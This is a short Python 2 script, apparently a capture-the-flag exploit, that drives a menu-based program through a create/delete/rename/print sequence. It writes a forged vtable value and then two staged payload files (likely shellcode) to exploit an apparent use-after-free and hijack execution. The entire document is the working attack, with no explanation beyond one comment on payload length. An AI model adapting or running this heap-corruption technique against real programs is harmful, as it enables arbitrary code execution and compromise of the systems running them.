#!/usr/bin/python2

import sys

fh = open('stage_1_cleaned', 'rb')
stage_1 = fh.read()
fh.close()

fh = open('stage_2', 'rb')
stage_2 = fh.read()
fh.close()

# stage 1 is 40 bytes long. make it 39 bytes long and replace last byte with
# 0x0A ('\n')
stage_1 = stage_1[:-1] + chr(0x0a)

vtable = '\x20\x10\x20\x18\xff\x0a'

sys.stdout.write('new\n')
sys.stdout.write('aaa\n')
sys.stdout.write('new\n')
sys.stdout.write('bbb\n')
sys.stdout.write('next\n')
sys.stdout.write('delete\n')
sys.stdout.write('first\n')
sys.stdout.write('rename\n')
sys.stdout.write(vtable)
sys.stdout.write('rename\n')
sys.stdout.write(stage_1)
sys.stdout.write('next\n')
sys.stdout.write('print\n')
sys.stdout.write(stage_2 + chr(0x99))